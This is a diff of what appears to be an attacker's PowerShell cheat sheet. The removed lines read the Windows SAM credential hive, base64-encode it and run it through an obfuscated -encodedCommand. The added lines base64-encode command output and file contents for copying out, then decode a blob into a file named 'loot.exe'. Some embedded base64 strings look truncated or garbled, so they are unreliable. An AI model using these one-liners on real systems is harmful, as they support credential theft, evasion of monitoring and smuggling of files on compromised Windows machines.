@@ -1,15 +1,14 @@
-####CONVERT TO B64 COMMAND -- Dumps b64 encoded files
-#in powershell do
+####CONVERT TO JSON-B64 COMMAND OUTPUT
+#Run cmd
+powershell $cmd=(ipconfig|ConvertTo-Json);$b=[System.Text.Encoding]::Unicode.GetBytes($cmd);$out =[Convert]::ToBase64String($b);Write-Host $out
 
-$command = '$fileName = "C:\windows\system32\config\SAM"
-$fileContent = get-content $fileName
-$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
-$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
-Write-Host "$fileContentEncoded"'
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-$encodedCommand = [Convert]::ToBase64String($bytes)
-$encodedCommand
+#To decode
+powershell $enc='GMAaQBmAGkAYwAgAEQATgBTACAAUwB1AGYAZgBpAHgAIAAgAC4AIAA6ACAAIgANAAoAXQA=';$dec=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($enc));($dec|ConvertFrom-Json)
 
+###Dump Files RAW b64
+#Get file contents
+powershell $cmd=(Get-Content "hashcat32.bin");$b=[System.Text.Encoding]::Unicode.GetBytes($cmd);$out =[Convert]::ToBase64String($b);Write-Host $out
 
-#To execute 
-powershell -encodedCommand "$encodedCommand"
+#Dump file contents
+powershell $enc='IAIAAgACAAQwBvAG4AbgBlAGMAdABpAG8AbgAtAHMAcABlAGMAaQBmAGkAYwAgAEQATgBTACAAUwB1AGYAZgBpAHgAIAAgAC4AIAA6ACAAIgANAAoAXQA=';$dec=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($enc));($dec | Out-File "loot.exe")
+
